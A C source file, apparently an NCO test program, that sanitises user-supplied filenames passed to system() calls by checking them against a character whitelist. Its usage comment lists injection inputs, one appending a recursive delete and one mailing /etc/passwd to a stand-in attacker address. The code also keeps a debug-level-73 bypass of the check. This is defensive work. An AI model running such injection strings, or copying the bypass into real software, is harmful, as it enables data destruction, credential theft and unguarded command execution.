/* Purpose: Sanitize user-input data passed to system() calls

   cc -o ${MY_BIN_DIR}/sanitize ~/sw/c/sanitize.c

   Usage:
   sanitize in.nc
   sanitize -D 3 'in.nc;'
   sanitize -D 3 '/path/to/in.nc;/bin/rm -r -f *'
   sanitize -D 3 '/path/to/in.nc;cat /etc/passwd | mail hacker@badguy.net'
   sanitize -D 3 '/path/to/in.nc; blacklist: ;|<>[](),*' */

#include <stdio.h> /* stderr, FILE, NULL, etc. */
#include <stdlib.h> /* atof, atoi, malloc, getopt */
#include <string.h> /* strcmp() */
#include <getopt.h>

char * nco_sng_sntz(char * const sng_drt);

/* Global variables declared here */
unsigned short int nco_dbg_fl=3; /* Debugging level */
unsigned short int nco_dbg_lvl=0; /* Debugging level */
unsigned short int nco_dbg_val=0; /* Debugging value */
unsigned short int nco_dbg_lvl_get(void); /* [sng] Debugging level */

char *nco_prg_nm="sanitize"; /* [sng] Name of program */
char *nco_prg_nm_get(void); /* [sng] Program name */
void nco_exit(const int rcd); /* [sng] Exit */

int main(int argc,char *argv[]){
  
  char *fl_in=NULL; /* [sng] Input file */
  char *fl_out=NULL; /* [sng] Output file */

  double dbl_foo=0.0; /* [frc] Intrinsic double temporary variable */
  float flt_foo=0.0; /* [frc] Intrinsic float temporary variable */
  short sht_foo=73; /* [frc] Intrinsic short temporary variable */

  unsigned int nco_dbg_lvl;
  
  /* Variables for option processing */
  char *opt_crr; /* [sng] String representation of current long-option name */
  char *opt_sng=NULL; /* [sng] String representation of current optarg, if any */ /* CEWI */
  extern char *optarg; /* [sng] Representation of current optarg, if any (system memory) */
  extern int optind; /* [enm] extern enumerating cardinal of current option */
  int opt; /* [enm] Value is zero if current argument is long type, else value contains single letter version of command line argument */
  int opt_idx=0; /* [idx] Index of current long option into opt_lng array */
  /* Short options: no colon = no arg, one colon = required arg, two colons = optional arg */
  const char * const opt_sht_lst="D:f:o:v-:"; /* List of single-letter (C-style) option abbreviations */

  static struct option opt_lng[]=
  {
    /* Option structure is {char *name,int has_arg,int *flag,int val} 
       has_arg is compared to enum _argtype{no_argument,required_argument,optional_argument}, 
       flag points to a variable that gets set to val whenever the name option is set.
       For long options that have zero flag field, getopt() returns contents of val
    */
    /* Long options with no argument, no short option counterpart */
    /* Long options with argument, no short option counterpart */
    {"dbl_foo",required_argument,0,0}, /* [frc] Intrinsic double temporary variable */
    {"sht_foo",required_argument,0,0}, /* [frc] Intrinsic short temporary variable */
    /* Long options with optional argument, no short option counterpart */
    /* Long options with short counterparts */
    {"dbg_lvl",required_argument,0,'D'}, /* [enm] Debugging level */
    {"debug",required_argument,0,'D'}, /* [enm] Debugging level */
    {"flt_foo",required_argument,0,'f'}, /* [frc] Intrinsic float temporary variable */
    {"output",required_argument,0,'o'},
    {"version",no_argument,0,'v'},
    {"verbose",no_argument,0,'D'},
    /* Last option named "0" to signal getopt_long() to stop processing */
    {0,0,0,0}
  }; /* end opt_lng */

  /* Parse command line arguments */
  while(1){
    /* getopt_long_only() allows a single dash '-' to prefix long options as well */
    opt=getopt_long_only(argc,argv,opt_sht_lst,opt_lng,&opt_idx);
    /* NB: access to opt_crr is only valid when long_opt was detected */
    opt_crr=(char *)strdup(opt_lng[opt_idx].name);
    if(optarg) opt_sng=optarg; /* Copy system memory into local string for safer operations */
    if(opt == EOF) break; /* Parse positional arguments once getopt_long_only() returns EOF */
    /* Process long options without short option counterparts */
    if(opt == 0){
      if(nco_dbg_lvl >= nco_dbg_fl){
	(void)fprintf(stdout,"Long option name: %s, ",opt_lng[opt_idx].name);
	if(optarg) (void)fprintf(stdout," Argument: %s\n",opt_sng); else (void)fprintf(stdout," No argument\n");
      } /* end if dbg */
      if(!strcmp(opt_crr,"dbl_foo")) dbl_foo=strtod(opt_sng,(char **)NULL);
      if(!strcmp(opt_crr,"flt_foo")) flt_foo=(float)strtod(opt_sng,(char **)NULL);
      if(!strcmp(opt_crr,"sht_foo")) sht_foo=(short)strtol(opt_sng,(char **)NULL,10);
    } /* opt != 0 */
    switch(opt){
    case 0: /* Long options have already been processed, return */
      break;
    case 'D': /* Debugging level.  Default is 0. */
      if(optarg) nco_dbg_lvl=(unsigned short int)strtoul(optarg,(char **)NULL,10);
      break;
    case 'f': /* Generic tuning parameter.  Default is 0. */
      flt_foo=(float)strtod(optarg,(char **)NULL);
      break;
    case 'o': /* Get the output file name. Default is stdout */
      fl_out=opt_sng;
      break;
    case 'v': /* CVS program info */
      (void)fprintf(stderr,"Version 1.0\n");
      exit(EXIT_SUCCESS);
      break;
    case '-': /* Long options are not allowed */
      (void)fprintf(stderr,"Long options are not available in this build. Use single letter options instead.\n");
      exit(EXIT_FAILURE);
      break;
    default: /* Print proper usage */
      (void)fprintf(stderr,"Print usage string here\n");
      exit(EXIT_FAILURE);
    } /* end switch */
  } /* end while loop */

  /* Process positional arguments */
  if(optind < argc){
    int psn_arg_nbr=argc-optind;
    if(psn_arg_nbr > 2){
      (void)fprintf(stdout,"ERROR too many positional arguments\n");
      exit(EXIT_FAILURE);
    }else if(psn_arg_nbr == 1){
      fl_out=(char *)strdup(argv[optind++]);
    }else if(psn_arg_nbr == 2){
      fl_in=(char *)strdup(argv[optind++]);
      fl_out=(char *)strdup(argv[optind++]);
    } /* end else */
  } /* end if */

  if(fl_out) fl_out=nco_sng_sntz(fl_out);

  return EXIT_SUCCESS;
} /* !main() */

char * /* O [sng] Sanitized string */
nco_sng_sntz /* [fnc] Ensure input string contains only white-listed innocuous characters */
(char * const sng_drt) /* I/O [sng] String to sanitize */
{
  const char fnc_nm[]="nco_sng_sntz()"; /* [sng] Function name */
    
  /* Whitelist algorithm based on:
     https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems 
     NCO modifications to whitelist:
     20180214: Allow colons (WRF filenames sometimes have timestamps with colons, Windows drive labels have colons) 
     20180214: Allow spaces? (Methinks some Windows people do have data files with spaces)
     20180214: Allow forward slash on UNIX, backslash on Windows (path separators) 
     Crucial characters that are implicitly blacklisted (and could be transformed into underscores) are:
     ";|<>[](),*" */
  static char wht_lst[]="abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "1234567890_-.@"
    " :"
#ifndef _MSC_VER
    "/";
#else /* !_MSC_VER */
  "\\";
#endif /* !_MSC_VER */
  /* ": re-balance syntax highlighting */
  
  char *usr_dta=sng_drt;
  char *cp=usr_dta; /* Cursor into string */
  
  if(nco_dbg_lvl_get() >= nco_dbg_fl) (void)fprintf(stderr,"%s: DEBUG %s reports unsanitized usr_dta = %s\n",nco_prg_nm_get(),fnc_nm,usr_dta);

  const char *sng_end=usr_dta+strlen(usr_dta);
  for(cp+=strspn(cp,wht_lst);cp!=sng_end;cp+=strspn(cp,wht_lst)){
    (void)fprintf(stderr,"%s: ERROR %s reports character \'%c\' from unsanitized user-input string \"%s\" is not on whitelist of acceptable characters. For security purposes NCO restricts the set of characters appearing in user input, including filenames, to: \"%s\". NB: This restriction was first imposed in NCO 4.7.3 (February, 2018), and may cause breakage of older workflows. Please contact NCO if you have a real-world use-case that shows why the character \'%c\' should be white-listed. HINT: Re-try command after replacing transgressing characters with innocuous characters.\n",nco_prg_nm_get(),fnc_nm,*cp,usr_dta,wht_lst,*cp);
    /* Uncomment next two lines to sanitize unsafe character with an underscore
     *cp='_';
     if(nco_dbg_lvl_get() >= nco_dbg_fl) (void)fprintf(stderr,"%s: DEBUG %s reports sanitized usr_dta = %s\n",nco_prg_nm_get(),fnc_nm,usr_dta); */

    /* Provide escape route so newly broken workflows will still work with -D 73
       Eliminate back-door after a few new versions of NCO, e.g., by version 4.7.5 */
    if(nco_dbg_lvl_get() != 73) nco_exit(EXIT_FAILURE);
  } /* !cp */

  return usr_dta;
} /* !nco_sng_sntz() */

char *nco_prg_nm_get(void){return nco_prg_nm;} /* [sng] Program name */
unsigned short int nco_dbg_lvl_get(void){return nco_dbg_lvl;} /* [sng] Debugging level */
void nco_exit(const int rcd){exit(rcd);} /* [sng] Exit */
